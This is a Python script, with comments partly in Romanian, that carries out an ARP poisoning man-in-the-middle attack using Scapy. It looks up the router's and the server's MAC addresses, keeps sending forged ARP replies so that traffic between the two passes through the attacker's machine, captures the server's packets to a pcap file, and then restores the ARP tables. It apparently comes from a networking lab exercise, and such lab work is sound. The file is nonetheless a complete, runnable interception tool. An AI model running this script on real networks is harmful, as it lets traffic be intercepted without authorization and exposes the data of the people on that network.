from scapy.all import *
import os
import signal
import sys
import threading
import time

#Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
#an ARP reply with MAC Address

# Functia gaseste MAC-ul unui IP trimis prin parametru.
def get_mac(ip_address):
    #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    # Se trimite un packet de nivel 3 
    # cu opcode-ul 1(Request <-> where-is)
    # Mesajul este de tip broadcast -> Se intreaba toate dispozitivele din reteaua
    # locala (hwdst="ff:ff:ff:ff:ff:ff") daca se poate identifica IP-ul (pdst=ip_address)
    # In caz afirmativ, se va primi un raspuns.
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        print(f"Raspuns adresa MAC pentru IP-ul {ip_address}: ")
        print(r[ARP].display())
        
        #hwdst, pdst = adresele IP/MAC ale noastre
        #hwsrc, psrc = adresele IP/MAC cautate, primite de la raspunusul device-ului interogat mai sus
        return r[ARP].hwsrc
    return None

#Se reface legatura originala intre router si server, 
#prin oferirea corecta de MAC-uri. Daca nu am face asta, dupa oprirea interceptarii
#datelor de catre middle, comunicarea ar fi imposibila intre cele 2 deviceuri pana
#la o eventuala invalidare a cache-ului care tine minte tabela de MAC-uri.  
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    #Ii comunicam (is-at) serverului MAC-ul asociat IP-ului routerului.
    #dst = router
    #src = server
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    #Ii comunicam (is-at) routerului MAC-ul asociat IP-ului serverului.
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)

    #kill process 
    os.kill(os.getpid(), signal.SIGTERM)

#Trimite mesaje la fiecare 2 secunde cu scopul de a dezinforma 
#dispozitivele in legatura cu adresele MAC asociate IP-urilor, in sensul ca
#se vor trimite pachete de nivel 3 cu opcode 2 (Reply <-> is-at)
#in care vom transmite pe rand serverului ca middle este router, 
#iar routerului ca middle este serverul, schimbul de date fiind "routat"
#astfel prin middle.
#Fiecare pachet ARP are hwsrc setat cu MAC-ul containerului middle.
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            # 
            print("-------------")
            print("Informam routerul de faptul ca noi suntem serverul")
            arp = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
            send(arp)
            arp.display()
            print("Informam serverul de faptul ca noi suntem routerul")
            arp2 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            send(arp2)
            arp2.display()
            print("------------------")
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        #In caz de eroare, aducem legaturile la normal pentru ca serverul sa poata comunica
        #din nou cu routerul
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

#SCRIPT DATA

# IP router/gateway
gateway_ip = "198.7.0.1"

# IP server
target_ip = "198.7.0.2"
packet_count = 100

#Start the script
print("[*] Pornire script captare")

print(f"[*] IP router: {gateway_ip}")
print(f"[*] IP server: {target_ip}")

#gateway_mac = MAC router
#target_mac = MAC server

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Adresa MAC obtinuta pentru router: {gateway_mac}")

target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Adresa MAC obtinuta pentru server: {target_mac}")

#ARP poison thread
#Otravirea se face intr-un thread pt a nu bloca programul.
poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

#Sniff traffic and write to file. Capture is filtered on target machine
try:
    # Se captureaza tot traficul si se salveaza intr-un fisier .pcap care poate fi citit cu wireshark
    # Se captureaza doar pachetele primite de la target_id (server)
    sniff_filter = "ip host " + target_ip
    print(f"[*] Se capteaza traficul. Numarul maxim de pachete captate: {packet_count}. Filtru: {sniff_filter}")
    packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
    print(packets.display())
    wrpcap(target_ip + "_capture.pcap", packets)
    print(f"[*] Se opreste captarea si se scrie in fisierul .pcap. Se reface conexiunea initiala.")

    # Se reface conexiunea anterioara
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    print(f"[*] Se opreste captarea. Se reface conexiunea initiala.")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)